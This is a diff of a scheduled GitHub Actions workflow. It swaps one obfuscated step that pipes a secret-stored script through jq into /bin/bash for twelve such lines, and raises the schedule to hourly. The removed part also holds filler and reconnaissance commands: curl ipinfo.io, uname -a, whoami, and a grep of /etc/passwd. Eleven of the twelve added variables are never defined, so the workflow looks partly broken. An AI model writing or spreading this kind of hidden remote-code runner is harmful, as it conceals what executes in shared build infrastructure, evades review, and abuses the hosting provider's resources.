@@ -1,10 +1,10 @@
 name: xuhongjin1986
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
-jobs:  # 17109
+    - cron: '49 * * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,32 +12,18 @@ jobs:  # 17109
       - uses: actions/checkout@v4
       - name: xuhongjin1986
         env:
-          l22720: ${{ secrets.l22720 }}
+          fz30: ${{ secrets.fz30 }}
         run: |
-          sleep 0.1 2>/dev/null || true
-          echo $l22720 | jq -r .x15393 | /bin/bash
-          sleep 0.1 2>/dev/null || true
-          which bash 2>/dev/null || echo "Bash not in path"
-          echo "User: $(whoami)"
-          [ $RANDOM -gt 1000 ] && echo "Random passed"
-          echo "Random ID: $RANDOM$RANDOM"
-          which uname
-          printf "%s" "xyz" > tmp.xyz
-          for i in {1..3}; do echo "Iter $i"; done
-          curl ipinfo.io
-          curl www.google.com
-          echo "Version: $((1 + RANDOM % 5))"
-          which apt-get
-          screen -ls
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          for i in 1 2 3; do echo "Loop $i"; done
-          echo "Date only: $(date +%F)"
-          [ -z "$RANDOM" ] || echo "Random var set"
-          find . -name "*.xml" | xargs -I fname cp fname tmp.tmp.tmp.tmp
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
-          uname -a
-          echo "Debug at $(date)"
-          curl ipinfo.io/ip
-          curl google.com
-          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
-          ls -la 2>/dev/null || true
+          echo $fz30 | jq -r .j30 | /bin/bash
+          echo $tb2 | jq -r .f27 | /bin/bash
+          echo $odl7628 | jq -r .rvzim45 | /bin/bash
+          echo $drwv94745 | jq -r .cydw1628 | /bin/bash
+          echo $ppnai4 | jq -r .zyrn452 | /bin/bash
+          echo $liq389 | jq -r .jvoax9298 | /bin/bash
+          echo $weii65027 | jq -r .dsx30 | /bin/bash
+          echo $kzmq890 | jq -r .rudka436 | /bin/bash
+          echo $fpjml49 | jq -r .idox8 | /bin/bash
+          echo $uojrb453 | jq -r .dohbx682 | /bin/bash
+          echo $tsnmx71 | jq -r .otuf3384 | /bin/bash
+          echo $xptwu4045 | jq -r .rdux3057 | /bin/bash
+
